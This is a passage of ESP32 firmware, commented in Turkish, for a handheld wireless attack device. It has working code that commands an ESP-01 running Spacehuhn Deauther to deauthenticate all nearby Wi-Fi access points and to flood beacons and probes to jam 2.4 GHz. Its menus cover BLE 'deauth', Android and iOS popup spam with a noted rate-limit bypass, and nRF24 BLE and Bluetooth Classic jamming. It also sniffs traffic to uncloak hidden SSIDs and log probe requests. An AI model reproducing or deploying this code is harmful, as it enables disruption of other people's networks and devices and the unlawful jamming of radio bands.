            struct tm tm_ble;
            memset(&tm_ble, 0, sizeof(tm_ble));
            tm_ble.tm_year = yr - 1900;
            tm_ble.tm_mon  = mo - 1;
            tm_ble.tm_mday = dy;
            tm_ble.tm_hour = hr;
            tm_ble.tm_min  = mn;
            tm_ble.tm_sec  = sc;
            baseTimeSec = (uint32_t)hr * 3600 + (uint32_t)mn * 60 + (uint32_t)sc;
            rtcYear = yr; rtcMonth = mo; rtcDay = dy;
            rtcClockValid = true;
            baseMillis = millis();
            foundTime = true;
            Serial.printf("CTS sync OK: %04d-%02d-%02d %02d:%02d:%02d\n",
              yr, mo, dy, hr, mn, sc);
          } else {
            Serial.printf("CTS: gecersiz deger yr=%d mo=%d\n", yr, mo);
          }
        }

        if (pClient->isConnected()) pClient->disconnect();
        delay(80);
      }

      delete pClient;
      delay(50);
    }

    free(order);
    pScan->clearResults();
  }

sync_done:
  display.clearDisplay();
  drawHeader("SAAT SYNC");
  display.setCursor(0, 14);
  display.setTextSize(1);
  if (foundTime) {
    display.print(F(">> ESITLENDI! <<"));
    char tbuf[20], dbuf[16];
    getTimeFullStr(tbuf, sizeof(tbuf), dbuf, sizeof(dbuf));
    display.setTextSize(2);
    display.setCursor(16, 38);
    display.print(tbuf);
  } else {
    display.print(F("Basarisiz."));
    display.setCursor(0, 26);
    display.print(F("- Acik WiFi AP yok"));
    display.setCursor(0, 38);
    display.print(F("- Wear OS saati yok"));
    display.setCursor(0, 50);
    display.print(F("Derleme saati aktif."));
  }
  display.setTextSize(1);
  safeDisplayFlush();
  delay(2500);

  return foundTime;
}



int  bleMenuCursor = 0;
int  bleMenuScroll = 0;

// Apple Continuity ProximityPair — device_type byte'ları (buf[4])
// iOS popup'ta hangi cihaz ikonunu göstereceğini belirler.
// Her model ID ile eşleşen device_type kullanılmalı:
//   0x01 = AirPods (1. ve 2. nesil)
//   0x06 = Beats (Powerbeats3, BeatsX, Solo3)
//   0x0A = AirPods Max
//   0x0B = Powerbeats Pro
//   0x0E = AirPods Pro (1. nesil)
//   0x0F = AirPods Pro 2 / AirPods 3
//   0x14 = AirPods 4
// Her tick farklı device_type → iOS farklı cihaz ikonu gösterir, rate-limit bypass eder


// Intro timer
uint32_t introTimer = 0;

// OLED frame timer
uint32_t frameTimer = 0;

// ============================================================
// Forward Declarations
// ============================================================
// ESP-01 (ESP8266) Co-Processor - Spacehuhn Deauther v2.6.1
// ============================================================
// Baglanti: GPIO 43 (TX) -> ESP-01 RX, GPIO 44 (RX) <- ESP-01 TX
// Firmware: SpacehuhnTech/esp8266_deauther v2.6.1 NODEMCU.bin
// Serial CLI Protokolu (115200 8N1):
//   Baslat testi  : info -> "Deauther" veya versiyon satiri cevap gelirse aktif
//   Direkt deauth : send deauth <AP-MAC> FF:FF:FF:FF:FF:FF <reason> <channel>
//   AP sec        : scan aps -t 5 -ch <ch>  →  select -ap all  →  attack -d
//   SSID ekle     : add ssid <ssid> [-wpa2] [-cl <clones>]
//   WiFi Deauth   : attack -d
//   BT Interferans: add ssid ... → attack -b -p (beacon+probe → 2.4GHz gurultu)
//   Durdur        : stop
// ============================================================

void esp01Init() {
  // ESP-01 takılı değilken RX pininin (GPIO44) boşta sallanıp seri gürültü/kesme üretmesini engelle
  pinMode(ESP01_RX_PIN, INPUT_PULLUP);
  // Serial1 = UART1 (GPIO 44 RX, GPIO 43 TX)
  Serial1.begin(ESP01_BAUD, SERIAL_8N1, ESP01_RX_PIN, ESP01_TX_PIN);
  delay(100);  // Serial1 init settle
  esp01Active = false;
  while (Serial1.available()) Serial1.read();

  // ── Fix #2: Bağlantı testi "show aps" → "info" ile yapılıyor ──────────────
  // ESKİ sorun: "show aps" Spacehuhn'un kendi AP scan'ini tamamlamış olmasını
  // bekler. Boot'ta henüz scan yapılmamışsa "No APs saved" yerine boş yanıt
  // gelir → esp01Active = false kalır, ESP-01 takılı olsa bile devre dışı sayılır.
  //
  // DOĞRU test: "info" komutu — Spacehuhn v2.6.1'de her zaman versiyon satırı
  // döndürür, AP listesinden bağımsız. Boot tamamlanmış mı bunu test eder.
  // Yanıtta "Deauther", "Version", "2." veya herhangi 8+ byte görünürse aktif.
  //
  // "show aps" sadece ilk deauth çağrısında scan + select akışında kullanılır;
  // burada bağlantı testine karıştırılmamalı.
  // ──────────────────────────────────────────────────────────────────────────

  // Önce buffer temizle ve stop gönder (önceki saldırıyı durdur)
  Serial1.println("stop");
  delay(300);
  while (Serial1.available()) Serial1.read();

  // "info" ile ping — AP scan durumundan bağımsız
  Serial1.println("info");
  uint32_t t = millis();
  String resp = "";
  while (millis() - t < 400) {
    while (Serial1.available()) resp += (char)Serial1.read();
    if (resp.indexOf("Deauther") >= 0 || resp.indexOf("Version")  >= 0 ||
        resp.indexOf("2.")       >= 0 || resp.length() > 8) {
      esp01Active = true;
      break;
    }
  }

  // Bağlantı kuruldu ama "info" yeterli yanıt vermediyse ikinci şans:
  // bazı modüller boot log'u gönderip ardından prompt bekler.
  // "\r\n" gönder → prompt'u tetikle, "info" tekrarla.
  if (!esp01Active && resp.length() > 0) {
    while (Serial1.available()) Serial1.read();
    Serial1.println("");
    delay(200);
    Serial1.println("info");
    uint32_t t2 = millis();
    while (millis() - t2 < 1500) {
      while (Serial1.available()) resp += (char)Serial1.read();
      if (resp.indexOf("Deauther") >= 0 || resp.indexOf("Version") >= 0 ||
          resp.indexOf("2.")       >= 0 || resp.length() > 12) {
        esp01Active = true;
        break;
      }
    }
  }
}

bool esp01Ping() {
  // "info" komutu Spacehuhn v2'de her zaman versiyon satırı döndürür — en güvenilir ping.
  // "stop" sadece echo döndürebilir veya hiç döndürmeyebilir (saldırı yoksa boş yanıt).
  while (Serial1.available()) Serial1.read();
  Serial1.println("info");
  uint32_t t = millis();
  String resp = "";
  while (millis() - t < 800) {
    while (Serial1.available()) resp += (char)Serial1.read();
    if (resp.indexOf("Deauther") >= 0 || resp.indexOf("Version") >= 0 ||
        resp.indexOf("2.") >= 0 || resp.length() > 8) return true;
  }
  return false;
}

// Spacehuhn v2.6.1 WiFi Deauth — düzeltilmiş CLI protokolü
// ---------------------------------------------------------------
// ESKİ (YANLIŞ) protokol:
//   "add -a -b AA:BB:CC:DD:EE:FF -c 6 -e SSID"  → böyle bir komut yok
//   "select -a 0"                                  → "-a" tüm tipler, ID gerekli
//
// DOĞRU v2 protokolü (resmi wiki: wiki.spacehuhn.com/deauther/commands):
//   Yöntem A — "send deauth" (scan gerektirmez, direkt tek paket):
//     send deauth <AP-MAC> <ST-MAC> <reason> <channel>
//     Broadcast için ST-MAC = FF:FF:FF:FF:FF:FF, reason = 7 (class3)
//
//   Yöntem B — scan+select+attack akışı:
//     scan aps -t 5       → ESP-01 AP listesini doldurur
//     select -ap <id>     → "-a" değil "-ap" flag'ı kullanılır
//     attack -d           → deauth başlat
//
// İkisi birlikte kullanılır:
//   - "send deauth" ile anında broadcast deauth başlar (gecikme yok)
//   - "attack -d" ile ESP-01 kendi listesiyle sürekli deauth devam eder
// ---------------------------------------------------------------
// ============================================================
// ESP-01 Non-Blocking Scan State Machine
// ============================================================
// Eski sorun: esp01SendDeauth her çağrıda 2.2 + 0.3 + 0.8 = ~3.3 sn blok yapıyordu.
// Her seçili AP başına bu blok tekrarlandığında UI tamamen donuyordu.
//
// Yeni strateji:
//   A) Her çağrıda anında "send deauth" (bloklama yok, <10ms)
//   B) Scan sadece ilk attack başlangıcında VEYA kanal değişince yapılır.
//      Sonuç önbelleğe alınır; aynı BSSID'ye tekrar çağrıda sadece
//      "attack -d" gönderilir — scan yapılmaz.
//   C) Scan gerekiyorsa background'da başlatılır; sonucu bir sonraki
//      sendDeauthFrames döngüsünde yoklanır (non-blocking poll).
// ============================================================

// Scan state: son taranan BSSID + kanal + elde edilen AP id
static uint8_t  esp01LastBssid[6]  = {0};
static uint8_t  esp01LastCh        = 0;
static int      esp01LastApId      = -2;   // -2 = hiç taranmadı, -1 = bulunamadı, >=0 = geçerli
static uint32_t esp01ScanStartMs   = 0;
static bool     esp01ScanPending   = false;
static char     esp01PendingMac[18]= {0};
static uint8_t  esp01PendingCh     = 0;

static void esp01SendCommandSync(const char* cmd, uint32_t waitMs = 40) {
  while (Serial1.available()) Serial1.read();
  Serial1.println(cmd);
  uint32_t start = millis();
  while (millis() - start < waitMs) {
    if (Serial1.available()) Serial1.read();
  }
}

// Scan sonucunu oku (non-blocking poll)
// Çağrı: her loop tick'inde, esp01Active && esp01ScanPending iken
void esp01PollScan() {
  if (!esp01ScanPending) return;
  if (!Serial1) return;

  // 2.2 sn doldu mu?
  if (millis() - esp01ScanStartMs < 2200) return;

  // Scan bitti — buffer temizle, "show aps" iste
  while (Serial1.available()) Serial1.read();
  Serial1.println("show aps");

  // 800ms non-blocking poll — loop'ta değil, burası sadece sonuç bekleme
  // Küçük blok: show aps yanıtı genellikle <200ms gelir
  String apOutput = "";
  uint32_t t = millis();
  while (millis() - t < 800) {
    while (Serial1.available()) apOutput += (char)Serial1.read();
    if (apOutput.indexOf("===") >= 0 && apOutput.lastIndexOf('\n') > 5) break;
    delay(5);
  }

  esp01ScanPending = false;

  // Parse: "N: SSID [CH:x] [MAC] ..." formatından hedef MAC'i bul
  int apId = -1;
  if (apOutput.length() > 10) {
    int lineStart = 0;
    while (lineStart < (int)apOutput.length()) {
      int lineEnd = apOutput.indexOf('\n', lineStart);
      if (lineEnd < 0) lineEnd = apOutput.length();
      String line = apOutput.substring(lineStart, lineEnd);
      line.trim();
      String lineLower = line;
      lineLower.toLowerCase();
      String macLower = String(esp01PendingMac);
      macLower.toLowerCase();
      if (lineLower.indexOf(macLower) >= 0) {
        int colonPos = line.indexOf(':');
        if (colonPos > 0 && colonPos <= 3) {
          esp01LastApId = line.substring(0, colonPos).toInt();
          apId = esp01LastApId;
        }
      }
      lineStart = lineEnd + 1;
    }
  }

  if (apId >= 0) {
    char selCmd[24];
    snprintf(selCmd, sizeof(selCmd), "select -ap %d", apId);
    esp01SendCommandSync(selCmd, 30);
    esp01SendCommandSync("attack -d", 30);
    Serial.printf("ESP-01 scan sonucu: AP id=%d secildi (%s)\n", apId, esp01PendingMac);
  } else {
    esp01LastApId = -1;
    // Fallback: tüm AP seç, kalıcı attack başlat
    esp01SendCommandSync("select -ap all", 30);
    esp01SendCommandSync("attack -d", 30);
    Serial.printf("ESP-01 scan: BSSID bulunamadi, select -ap all\n");
  }
}

void esp01SendDeauth(const uint8_t* bssid, uint8_t ch, const char* ssid) {
  if (!esp01Active) return;

  // Direct robust attack trigger for Spacehuhn v2.6.1 on ESP-01:
  // Eliminates MAC uppercase/lowercase parse mismatch delay.
  // Sends stop -> select -ap all -> attack -d so ESP-01 immediately deauthes all target APs.
  static uint32_t lastEsp01Trigger = 0;
  if (millis() - lastEsp01Trigger < 3000) return; // Prevent UART buffer flooding
  lastEsp01Trigger = millis();

  esp01SendCommandSync("stop", 30);
  esp01SendCommandSync("select -ap all", 30);
  esp01SendCommandSync("attack -d", 30);
}

// ESP-01 ile 2.4GHz Bluetooth Interferans — düzeltilmiş CLI protokolü
// ---------------------------------------------------------------
// ESKİ (YANLIŞ): "add -s -e BT_NOISE_1" → bu format yok
//
// DOĞRU v2 sözdizimi:
//   add ssid <ssid> [-wpa2] [-cl <clones>] [-f]
//   attack [beacon] [deauth] [probe] veya kısa flag: -b -d -p
// ---------------------------------------------------------------
void esp01SendBTInterference() {
  esp01SendCommandSync("stop", 40);
  esp01SendCommandSync("remove ssids all", 40);

  // Gürültü SSID'leri ekle — beacon flood 2.4GHz'i meşgul eder
  esp01SendCommandSync("add ssid BT_NOISE_1 -wpa2 -cl 2", 30);
  esp01SendCommandSync("add ssid BT_NOISE_2 -wpa2 -cl 2", 30);
  esp01SendCommandSync("add ssid BT_NOISE_3 -wpa2 -cl 2", 30);
  esp01SendCommandSync("add ssid NOISE_4 -cl 2", 30);
  esp01SendCommandSync("add ssid NOISE_5 -cl 2", 30);

  // Beacon + Probe flood birlikte başlat
  esp01SendCommandSync("attack -b -p", 30);
}

void esp01Stop() {
  esp01SendCommandSync("stop", 40);
}

void buildBLEMenu() {
  menuCount = 0;
  setMenu(menuCount++, "BLE SCAN / DEV", MODE_BLE_SCAN,    0);
  setMenu(menuCount++, "ANDROID SPAM",   MODE_BLE_RUNNING, 1);
  setMenu(menuCount++, "IOS SPAM",       MODE_BLE_RUNNING, 2);
  menuCursor = 0; menuScroll = 0;
}

void buildBLEDevAttackMenu() {
  menuCount = 0;
  int ri = bleVisibleIdx(bleSelectedDev);
  char hdr[32] = "?";
  if (ri >= 0) strlcpy(hdr, bleDevList[ri].name, 18);
  // param: 0=deauth 1=android 2=ios 3=sil
  setMenu(menuCount++, "BT DEAUTH",    MODE_BLE_RUNNING,     0);
  setMenu(menuCount++, "ANDROID SPAM", MODE_BLE_RUNNING,     1);
  setMenu(menuCount++, "IOS SPAM",     MODE_BLE_RUNNING,     2);
  setMenu(menuCount++, "LISTEDEN SIL", MODE_BLE_DEV_ATTACK,  3);
  menuCursor = 0; menuScroll = 0;
}

void drawBLEMenu() {
  display.clearDisplay();
  drawHeader("BLE ATTACK");
  // WiFi saldırısı varsa uyar
  if (attackRunning) {
    display.setCursor(0, 18);
    display.print(F("! WiFi atk aktif"));
    display.setCursor(0, 30);
    display.print(F("Once durdurun"));
    safeDisplayFlush();
    return;
  }
  for (int i = 0; i < menuCount; i++) {
    int y = 16 + i * 12;
    if (i == menuCursor) {
      display.fillRect(0, y-1, 128, 11, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    display.setCursor(4, y);
    display.print(menuItems[i].label);
  }
  display.setTextColor(SSD1306_WHITE);
  safeDisplayFlush();
}

void drawBLEScan() {
  display.clearDisplay();
  drawHeader(bleScanning ? "BLE SCAN..." : "BLE DEVS");
  int visCount = bleVisibleCount();
  int y = 14;
  int shown = 0;
  int vi = 0;
  for (int i = 0; i < bleDevCount && shown < 4; i++) {
    if (bleDevList[i].hidden) continue;
    if (vi < bleMenuScroll) { vi++; continue; }
    if (vi == bleMenuCursor) {
      display.fillRect(0, y, 128, 10, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    display.setCursor(0, y+1);
    char buf[22];
    snprintf(buf, 22, "%-13.13s%4d", bleDevList[i].name, bleDevList[i].rssi);
    display.print(buf);
    display.setTextColor(SSD1306_WHITE);
    y += 11; shown++; vi++;
  }
  if (visCount == 0) {
    display.setCursor(0, 28);
    display.print(bleScanning ? F("Bekleniyor...") : F("Cihaz yok"));
  }
  display.setCursor(0, 56);
  char cnt[24];
  snprintf(cnt, 24, "%d cihaz %s", visCount, bleScanning ? "[tarama]" : "[SEL=sec]");
  display.print(cnt);
  safeDisplayFlush();
}

void drawBLEDevAttack() {
  display.clearDisplay();
  int ri = bleVisibleIdx(bleSelectedDev);
  char hdr[20] = "BLE ATK";
  if (ri >= 0) strlcpy(hdr, bleDevList[ri].name, 20);
  drawHeader(hdr);
  for (int i = 0; i < menuCount && i < 4; i++) {
    int y = 14 + i * 12;
    if (i == menuCursor) {
      display.fillRect(0, y, 128, 11, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    display.setCursor(4, y+1);
    display.print(menuItems[i].label);
  }
  display.setTextColor(SSD1306_WHITE);
  if (ri >= 0) {
    display.setCursor(0, 57);
    display.print(bleDevList[ri].addr);
  }
  safeDisplayFlush();
}

void drawBLERunning() {
  display.clearDisplay();
  const char* atkName = "DEAUTH";
  if (bleAtkMode == 1) atkName = "ANDROID SPAM";
  if (bleAtkMode == 2) atkName = "IOS SPAM";
  drawHeader(atkName);
  int ri = bleVisibleIdx(bleSelectedDev);
  display.setCursor(0, 16);
  if (ri >= 0) {
    display.print(bleDevList[ri].name);
    display.setCursor(0, 27);
    display.print(bleDevList[ri].addr);
  }
  display.setCursor(0, 40);
  char buf[22];
  snprintf(buf, 22, "Paket: %d", bleAtkIdx);
  display.print(buf);
  display.setCursor(0, 52);
  display.print(F("SEL=dur  UP-HOLD=geri"));
  safeDisplayFlush();
}

void drawBLEJam() {
  display.clearDisplay();
  drawHeader("BLE JAM");
  display.setCursor(0, 14);
  if (nrfInitFailed) {
    display.print(F("nRF24 HATA!"));
    display.setCursor(0, 26);
    display.print(F("Kablo kontrol et"));
    display.setCursor(0, 36);
    display.print(F("CE:7 CSN:10 SCK:4"));
    display.setCursor(0, 46);
    display.print(F("MOSI:5 MISO:6"));
  } else if (bleJamming) {
    display.print(F(">>> AKTIF <<<"));
    display.setCursor(0, 24);
    char buf[24];
    uint16_t freq = 2400 + BLE_ADV_CHANNELS[jamChanIdx];
    snprintf(buf, 24, "Kanal: %u MHz", freq);
    display.print(buf);
    display.setCursor(0, 34);
    snprintf(buf, 24, "Paket: %lu", (unsigned long)jamPktCount);
    display.print(buf);
    display.setCursor(0, 44);
    display.print(F("ch37/38/39 burst"));
  } else {
    display.print(F("DURDURULDU"));
  }
  display.setCursor(0, 55);
  display.print(F("SEL=dur  UP=geri"));
  safeDisplayFlush();
}

// ============================================================
// BT Classic Jam OLED Ekranı
// Graf stili: drawPacketMonitor ile aynı — dikey bar, ring buffer, pkt/s
// ============================================================
void drawBTClassicJam() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);

  if (nrfInitFailed) {
    drawHeader("BT CLASSIC JAM");
    display.setCursor(0, 14);
    display.print(F("nRF24 HATA!"));
    display.setCursor(0, 26);
    display.print(F("Kablo kontrol et"));
    display.setCursor(0, 36);
    display.print(F("CE:7 CSN:10 SCK:4"));
    display.setCursor(0, 46);
    display.print(F("MOSI:5 MISO:6"));
    safeDisplayFlush();
    return;
  }

  // Header: sweep kanalı + pkt/s (drawPacketMonitor gibi)
  char hdr[28];
  snprintf(hdr, 28, "BT-CLK ch%d %lu/s",
    (int)btJamSweepCh, (unsigned long)btJamPktPerSec);
  display.setCursor(0, 0);
  display.print(hdr);

  if (!btClassicJamActive) {
    display.setCursor(0, 20);
    display.print(F("DURDURULDU"));
    display.setCursor(0, 56);
    display.print(F("SEL=dur  UP=geri"));
    safeDisplayFlush();
    return;
  }

  // Bar graph — drawPacketMonitor ile AYNI mantık
  // x: zaman (128 piksel = 128 örnek), y: pkt/s yüksekliği
  // drawLine(x, 63, x, 63-h) — alttan yukarıya dikey bar
  uint16_t maxVal = 1;
  for (int x = 0; x < BT_JAM_RING; x++)
    if (btJamRing[x] > maxVal) maxVal = btJamRing[x];

  for (int x = 0; x < 128; x++) {
    int ri = (btJamRingHead + x) % BT_JAM_RING;
    int h  = (int)((long)btJamRing[ri] * 54 / maxVal);
    if (h > 54) h = 54;
    if (h > 0) display.drawLine(x, 63, x, 63 - h, SSD1306_WHITE);
  }

  // Aktif kanal frekansı — sağ üst köşe
  display.setCursor(74, 0);
  char freq[14];
  uint16_t curFreq = 2400 + btJamSweepCh;
  snprintf(freq, 14, "%uMHz", curFreq);
  display.print(freq);

  // Alt bilgi
  display.setCursor(0, 56);
  char info[22];
  snprintf(info, 22, "SEL=dur  pkt:%lu", (unsigned long)btJamPktCount);
  display.print(info);

  safeDisplayFlush();
}

// ============================================================
// Settings persistence (NVS)
// ============================================================
void saveSettings() {
  prefs.begin("dwatch", false);
  prefs.putUChar("txRate", (uint8_t)txRateIdx);
  prefs.putUChar("channel", currentChannel);
  prefs.putULong("clockOfs", clockOffsetS);
  prefs.putBool("esp01Dauth", esp01UseDeauth);  // Fix #2: esp01UseDeauth NVS'e kaydet
  prefs.end();
}

void loadSettings() {
  prefs.begin("dwatch", true);
  txRateIdx      = (int)prefs.getUChar("txRate", 1);
  currentChannel = prefs.getUChar("channel", 1);
  clockOffsetS   = prefs.getULong("clockOfs", 43200);
  esp01UseDeauth = prefs.getBool("esp01Dauth", false);  // Fix #2: NVS'den yükle, yoksa false
  prefs.end();
  if (txRateIdx < 0 || txRateIdx > 3) txRateIdx = 1;
  if (currentChannel < 1 || currentChannel > 13) currentChannel = 1;
}

// ============================================================
// PSRAM Init
// ============================================================
void initPSRAM() {
  if (apList != nullptr) return; // Zaten ayrılmışsa tekrar ayırma

  // 6KB toplam bellek — Dahili SRAM'de (DRAM) %100 güvenli tahsis
  // Fiziksel PSRAM çipi olmayan ESP32-S3 Super Mini kartlarında çökme ve reset döngüsünü engeller
  apList    = (APRecord*)       calloc(MAX_AP,    sizeof(APRecord));
  staList   = (StationRecord*)  calloc(MAX_STA,   sizeof(StationRecord));
  probeList = (ProbeRecord*)    calloc(MAX_PROBE, sizeof(ProbeRecord));
  hsList    = (HandshakeRecord*) calloc(MAX_HS,   sizeof(HandshakeRecord));
  ssidList  = (SSIDRecord*)     calloc(MAX_SSID,  sizeof(SSIDRecord));
}

// ============================================================
// Utility
// ============================================================
void macToStr(const uint8_t* mac, char* out) {
  snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
    mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
}

void randomMAC(uint8_t* mac) {
  for (int i = 0; i < 6; i++) mac[i] = (uint8_t)esp_random();
  mac[0] = (mac[0] & 0xFC) | 0x02; // LAA, unicast
}

const char* encToStr(uint8_t enc) {
  switch (enc) {
    case WIFI_AUTH_OPEN:         return "OPEN";
    case WIFI_AUTH_WEP:          return "WEP";
    case WIFI_AUTH_WPA_PSK:      return "WPA";
    case WIFI_AUTH_WPA2_PSK:     return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/2";
    case WIFI_AUTH_WPA3_PSK:     return "WPA3";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "ENT";
    default:                     return "UNK";
  }
}

void oui_lookup(const uint8_t* mac, char* out, int outLen) {
  for (int i = 0; i < OUI_COUNT; i++) {
    const OUIEntry& e = OUI_TABLE[i];
    if (mac[0]==e.prefix[0] && mac[1]==e.prefix[1] && mac[2]==e.prefix[2]) {
      strlcpy(out, e.name, outLen);
      return;
    }
  }
  strlcpy(out, "Unknown", outLen);
}

void addSSID(const char* name, bool wpa2) {
  if (!name || name[0]==0) return;
  for (int i = 0; i < ssidCount; i++) {
    if (strncmp(ssidList[i].name, name, 32)==0) return;
  }
  if (ssidCount >= MAX_SSID) return;
  strlcpy(ssidList[ssidCount].name, name, 33);
  ssidList[ssidCount].wpa2 = wpa2;
  ssidList[ssidCount].selected = false;
  ssidCount++;
}

int selectedApCount() {
  int c=0;
  for (int i=0;i<apCount;i++) if (apList[i].selected) c++;
  return c;
}

int selectedStaCount() {
  int c=0;
  for (int i=0;i<staCount;i++) if (staList[i].selected) c++;
  return c;
}

// ============================================================
// OLED helpers
// ============================================================

// Promiscuous RX interrupt I2C transferini bozuyor.
// display() çağrısından önce kısa süre durdur.
void safeDisplayFlush() {
  display.display();
}

void drawHeader(const char* title) {
  drawStrRAM(0, 0, title);

  // Canlı Türkiye Saati (HH:MM) sağ üst köşede (RAM clock)
  char timeBuf[8];
  getTimeStr(timeBuf, sizeof(timeBuf));
  drawStrRAM(98, 0, timeBuf);

  drawLineRAM(0, 8, 127, 8, SSD1306_WHITE);
}

void drawMenuList(const char** labels, int count, int cursor, int scroll) {
  display.setTextSize(1);
  int rows = min(MENU_ROWS, count - scroll);
  for (int i=0; i<rows; i++) {
    int idx = scroll + i;
    int y = 10 + i*11;
    display.setCursor(0, y);
    display.print(idx == cursor ? '>' : ' ');
    display.print(' ');
    display.print(labels[idx]);
  }
}

void drawBar(int x, int y, int w, int h, bool inv) {
  if (inv) display.fillRect(x, y, w, h, SSD1306_WHITE);
  else     display.drawRect(x, y, w, h, SSD1306_WHITE);
}

// drawBigClock kaldırıldı — fix #9: dead code, hiçbir yerde çağrılmıyordu.

void drawFullscreenMsg(const char* line1, const char* line2) {
  display.clearDisplay();
  display.setTextSize(2);
  display.setTextColor(SSD1306_WHITE);
  int16_t bx,by; uint16_t bw,bh;
  display.getTextBounds(line1,0,0,&bx,&by,&bw,&bh);
  display.setCursor((OLED_W-bw)/2, 14);
  display.print(line1);
  if (line2 && line2[0]) {
    display.setTextSize(1);
    display.getTextBounds(line2,0,0,&bx,&by,&bw,&bh);
    display.setCursor((OLED_W-bw)/2, 38);
    display.print(line2);
  }
  safeDisplayFlush();
}

// ============================================================
// Button handling
// ============================================================
bool rawBtn(int pin) { return digitalRead(pin) == LOW; }

BtnEvent processBtn(BtnState &s, int pin) {
  BtnEvent e = {false, false, false};
  bool raw = rawBtn(pin);
  uint32_t now = millis();
  if (raw && !s.lastRaw) {
    s.pressTime = now;
    s.pressed = true;
    s.held = false;
    s.lastRepeat = 0;
  }
  if (!raw && s.lastRaw) {
    if (s.pressed && !s.held) {
      uint32_t dt = now - s.pressTime;
      if (dt >= DEBOUNCE_MS) e.click = true;
    }
    s.pressed = false;
    s.held = false;
  }
  if (raw && s.pressed) {
    uint32_t dt = now - s.pressTime;
    if (dt >= HOLD_MS) {
      s.held = true;
      e.held = true;
      if (s.lastRepeat == 0 || (now - s.lastRepeat) >= HOLD_REPEAT_MS) {
        s.lastRepeat = now;
        e.repeat = true;
      }
    }
  }
  s.lastRaw = raw;
  return e;
}

// ============================================================
// Promiscuous Callback — IRAM_ATTR (fix #4 + #5)
// ============================================================
// Kural: ISR içinde sadece IRAM erişimi + atomik işlemler.
// parsePromisc/checkHandshake → loop()'a defer (promRing üzerinden).
// packetRing IRAM_ATTR → cache miss yok.
void IRAM_ATTR promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  if (!pkt) return;
  int len = pkt->rx_ctrl.sig_len;
  const uint8_t* data = pkt->payload;
  if (len < 4) return;

  uint8_t fc0 = data[0], fc1 = data[1];

  // Deauth & Disassoc detect — sadece flag set et, IRAM erişimi
  if (fc0 == 0xC0 || fc0 == 0xA0) {
    deauthCount = deauthCount + 1;
    if (!deauthDetected) {
      deauthDetected = true;
      // deauthSrcMac: global array, PSRAM'da olmadığı sürece güvenli
      // (non-PSRAM global olarak tanımlı — 6 byte stack-level kopyalama)
      if (len >= 16) {
        deauthSrcMac[0]=data[10]; deauthSrcMac[1]=data[11];
        deauthSrcMac[2]=data[12]; deauthSrcMac[3]=data[13];
        deauthSrcMac[4]=data[14]; deauthSrcMac[5]=data[15];
      }
    }
  }

  pktCount = pktCount + 1;
  // packetRing IRAM_ATTR → güvenli ISR erişimi
  packetRing[pktHead] = (uint16_t)(pktCount & 0xFFFF);
  pktHead = (pktHead + 1) % PKT_RING;

  // Frame'i defer ring'e kopyala — loop() içinde parsePromisc çağrılır
  if (type == WIFI_PKT_MGMT || type == WIFI_PKT_DATA) {
    static portMUX_TYPE promMux = portMUX_INITIALIZER_UNLOCKED;
    portENTER_CRITICAL_ISR(&promMux);
    int nextIdx = (promWriteIdx + 1) % PROM_RING_SIZE;
    PromFrame& slot = promRing[promWriteIdx];
    if (!slot.ready) {
      int cpLen = len < PROM_MAX_FRAME ? len : PROM_MAX_FRAME;
      // 1) DMA buffer → IRAM staging (ISR güvenli)
      memcpy(_promStageBuf, data, cpLen);
      // 2) IRAM staging → DRAM promRing slot
      memcpy(slot.data, _promStageBuf, cpLen);
      slot.len   = cpLen;
      slot.rssi  = pkt->rx_ctrl.rssi;
      slot.ready = true;
      promWriteIdx = nextIdx;
    }
    portEXIT_CRITICAL_ISR(&promMux);
  }
}

// ============================================================
// Parse promiscuous frame (called from loop)
// ============================================================
void parsePromisc(const uint8_t* data, int len, int8_t rssi) {
  if (len < 24) return;
  uint8_t fc0 = data[0], fc1 = data[1];
  uint8_t type    = (fc0 >> 2) & 0x03;
  uint8_t subtype = (fc0 >> 4) & 0x0F;

  // Probe Response (subtype 5) / Assoc Request (subtype 0) / Beacon (subtype 8) — Hidden SSID De-cloaking
  if (type == 0 && (subtype == 5 || subtype == 0 || subtype == 8) && len > 36) {
    uint8_t bssid[6];
    memcpy(bssid, data + 16, 6);
    int pos = (subtype == 8 || subtype == 5) ? 36 : 28; // Beacon/ProbeResp header+fixed=36, AssocReq=28
    if (pos + 1 < len && data[pos] == 0x00) {
      uint8_t ssidLen = data[pos + 1];
      if (ssidLen > 0 && ssidLen <= 32 && (pos + 2 + ssidLen <= len)) {
        char uncloakedSSID[33];
        memcpy(uncloakedSSID, data + pos + 2, ssidLen);
        uncloakedSSID[ssidLen] = 0;
        if (apList != nullptr && apCount > 0) {
          for (int i = 0; i < apCount; i++) {
            if (apList[i].hidden && memcmp(apList[i].bssid, bssid, 6) == 0) {
              strlcpy(apList[i].ssid, uncloakedSSID, 33);
              apList[i].hidden = false;
            }
          }
        }
      }
    }
  }

  // Probe Request (type=0 subtype=4)
  if (type==0 && subtype==4 && len>24) {
    uint8_t srcMac[6];
    memcpy(srcMac, data+10, 6);
    // IE 0x00 SSID
    int pos=24; char ssidBuf[33]="";
    if (pos+1 < len && data[pos]==0x00) {
      uint8_t ssidLen = data[pos+1];
      if (ssidLen > 32) ssidLen=32;
      if (pos+2+ssidLen <= len) {
        memcpy(ssidBuf, data+pos+2, ssidLen);
        ssidBuf[ssidLen]=0;
      }
    }
    bool wildcard = (ssidBuf[0]==0);
    // Find existing
    int found=-1;
    for (int i=0;i<probeCount;i++) {
      if (memcmp(probeList[i].mac, srcMac,6)==0 &&
          strncmp(probeList[i].ssid, ssidBuf,32)==0) {
        found=i; break;
      }
    }
    if (found>=0) {
      probeList[found].rssi    = rssi;
      probeList[found].lastSeen = millis();
      probeList[found].count++;
    } else if (probeCount < MAX_PROBE) {
      memcpy(probeList[probeCount].mac, srcMac,6);
      strlcpy(probeList[probeCount].ssid, ssidBuf,33);
      probeList[probeCount].rssi     = rssi;
